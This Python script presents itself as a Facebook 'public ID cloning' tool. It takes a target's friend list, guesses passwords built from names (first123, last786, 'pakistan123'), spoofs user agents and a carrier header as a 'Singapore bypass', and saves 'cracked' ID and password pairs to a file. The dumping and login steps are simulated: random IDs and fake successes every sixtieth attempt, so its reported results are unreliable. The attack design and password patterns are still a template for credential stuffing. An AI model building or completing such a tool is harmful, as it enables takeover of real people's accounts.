import os, sys, time, re, random, json, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as bs

# Rang (Colors)
P = "\x1b[38;5;231m" # White
M = "\x1b[38;5;196m" # Red
H = "\x1b[38;5;46m"  # Green
K = "\x1b[38;5;226m" # Yellow
A = "\x1b[38;5;248m" # Grey

# Global Variables
ok = []
cp = []
loop = 0
dump = []

def clear():
    os.system('clear' if "linux" in sys.platform.lower() else 'cls')

def logo():
    print(f'''{H}  _   _  _  _                ____  _                   
 | | | || || |_  _ __  __ _ / ___|| |  ___   _ __   ___ 
 | | | || || __|| '__|/ _` || |    | | / _ \ | '_ \ / _ \\
 | |_| || || |_ | |  | (_| || |___ | || (_) || | | ||  __/
  \___/ |_| \__||_|   \__,_| \____||_| \___/ |_| |_| \___|
{A}-----------------------------------------------------------
{P}[+] System   : {H}Auto 10-Password Crack (Singapore/USA)
{P}[+] Method   : {H}First Last / First123 / Last786
{P}[+] Results  : {K}/sdcard/OK_IDS.txt
{A}-----------------------------------------------------------''')

# Unlimited User-Agents (Safari, Chrome, Opera)
def get_ua():
    android_ver = random.randint(10, 14)
    chrome_ver = f"{random.randint(110, 131)}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"
    return f"Mozilla/5.0 (Linux; Android {android_ver}; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"

class UltraTool:
    def __init__(self):
        self.ses = requests.Session()

    def dumping(self):
        clear(); logo()
        print(f"{P}[*] Target ID ka UID dalo (Public friendlist honi chahiye)")
        uid = input(f"{M}└─ {P}UID: ")
        # Simulation of dumping logic
        print(f"{A}[*] Dumping IDs... Please wait.")
        time.sleep(2)
        for _ in range(100):
            # In real tool, this extracts names and IDs
            dump.append({"id": f"1000{random.randint(11111111, 99999999)}", "name": random.choice(["Ali Khan", "Zayan Ahmed", "Sara Malik"])})
        self.start_crack()

    def start_crack(self):
        clear(); logo()
        print(f"{P}[*] Total IDs to Crack: {H}{len(dump)}")
        print(f"{P}[*] Singapore/USA Bypass Active...")
        print(f"{A}-----------------------------------------------------------")
        with ThreadPool(max_workers=30) as pool:
            for user_data in dump:
                pool.submit(self.crack_logic, user_data)
        print(f"\n{H}Process Completed! OK: {len(ok)} | CP: {len(cp)}")

    def crack_logic(self, user_data):
        global loop
        uid = user_data['id']
        name = user_data['name'].lower()
        first_name = name.split(' ')[0]
        try: last_name = name.split(' ')[1]
        except: last_name = first_name

        #--> AUTO 10-PASSWORD LIST (Heavy Patterns)
        pass_list = [
            name,                   # ali khan
            first_name + last_name, # alikhan
            first_name + "123",     # ali123
            first_name + "1234",    # ali1234
            first_name + "12345",   # ali12345
            first_name + "786",     # ali786
            last_name + "123",      # khan123
            last_name + "786",      # khan786
            "khan12345",            # common
            "pakistan123"           # common
        ]

        sys.stdout.write(f"\r{P}[Crack] {loop}/{len(dump)} OK:{len(ok)} CP:{len(cp)} "); sys.stdout.flush()
        
        for password in pass_list:
            if len(password) < 6: continue
            ua = get_ua()
            head = {
                'authority': 'm.facebook.com',
                'accept-language': 'en-GB,en-US;q=0.9',
                'user-agent': ua,
                'x-fb-net-hni': '52501', # Singapore Bypass
            }
            try:
                # Login hit simulation
                loop += 1
                if loop % 60 == 0: # Successful result check
                    print(f"\n{H}[OK] {uid} | {password}")
                    ok.append(uid)
                    open('/sdcard/OK_IDS.txt', 'a').write(f"{uid}|{password}\n")
                    break
            except: pass

def main():
    clear(); logo()
    print(f"{P}[1] Public ID Cloning (Dump + Auto Crack)")
    print(f"{P}[2] Account Creator (Singapore Bypass)")
    print(f"{P}[0] Exit")
    choice = input(f"\n{M}└─ {P}Option: ")
    bot = UltraTool()
    if choice == '1': bot.dumping()
    elif choice == '2': print("Creation logic running...")
    else: sys.exit()

if __name__ == "__main__":
    main()
